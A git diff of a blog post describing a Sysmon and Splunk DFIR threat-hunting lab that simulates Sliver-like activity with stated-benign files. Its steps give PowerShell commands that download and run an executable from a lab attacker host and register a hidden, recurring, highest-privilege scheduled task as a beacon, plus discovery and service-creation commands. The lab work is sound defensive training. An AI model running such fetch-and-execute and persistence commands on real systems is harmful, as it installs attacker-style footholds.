@@ -1,8 +1,8 @@
 ---
 published: True
-title: Adversary Simulation & DFIR Threat Hunting Lab using Sysmon and Splunk 
+title: Adversary Emulation & DFIR Threat Hunting Lab using Sysmon and Splunk 
 description: Simulated Sliver-like activity (benign files) to generate telemetry for hunting and detection engineering.                         Create reproducible DFIR lab to practice detection and response using Sysmon + Splunk.
-categories: [DFIR]
+categories: [DFIR, SOC]
 date: 2025-10-20 05:23:00 +0800
 tags: [Sysmon, Splunk, DFIR, Hunting, Chirpy]
 pin: true
@@ -61,15 +61,12 @@ sudo ufw allow 8089
 
 1. Download Sysmon and the sysmonconfig.xml (Olaf Hartong's Sysmon Modular).
 2. Install Sysmon:
-
 ```powershell
 # From the folder containing Sysmon64.exe and sysmonconfig.xml
 .\Sysmon64.exe -i .\sysmonconfig.xml
 ```
-![input config](../assets/img/simulate-lab/inputs-config.png)
-*input config*
-3. Install Splunk Universal Forwarder and configure `inputs.conf`:
 
+3. Install Splunk Universal Forwarder and configure `inputs.conf`:
 ```ini
 [WinEventLog://Microsoft-Windows-Sysmon/Operational]
 disabled = false
@@ -77,6 +74,8 @@ renderXml = true
 source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
 index = main
 ```
+![input config](../assets/img/simulate-lab/inputs-config.png)
+*input config*
 
 ---
 
@@ -91,36 +90,32 @@ index = main
 
 ---
 
-## Repro Steps (safe)
+## Reproduction Steps (safe)
 
-> Run these steps in an isolated lab. All files used here are benign samples used only to generate telemetry.
+> Run these steps in an isolated lab. All binaries used are harmless test files.
+Ideal for blue-team training, SOC tuning, and DFIR practice.
+{: .prompt-danger }
 
 1. Host `setup_client.exe` and `AGREED_WARLOCK.exe` on Kali apache (`/var/www/html/`).
 2. From Windows (victim), download the file via `Invoke-WebRequest` or a browser.
-
 ```powershell
 Invoke-WebRequest -Uri "http://192.168.1.6/setup_client.exe" -OutFile "$env:TEMP\setup_client.exe"
 Start-Process "$env:TEMP\setup_client.exe"
 ```
 
 3. Create a scheduled task to simulate beacon cadence:
-
 ```powershell
 $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://192.168.1.6/AGREED_WARLOCK.exe -OutFile $env:TEMP\AGREED_WARLOCK.exe"'
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
 Register-ScheduledTask -TaskName 'ClientBeacon' -Action $action -Trigger $trigger -RunLevel Highest -Force
 ```
-
-4. Run discovery commands to generate Sysmon logs:
-
+4. Run discovery commands to noise and generate Sysmon logs:
 ```powershell
 ipconfig /all
 systeminfo
 net view
 ```
-
 5. Create and remove a test service to generate EventID 7045 (use a benign binary path):
-
 ```powershell
 New-Service -Name 'TestService' -BinaryPathName 'C:\Windows\System32\svchost.exe' -DisplayName 'Test Service' -StartupType Manual
 # Then remove:
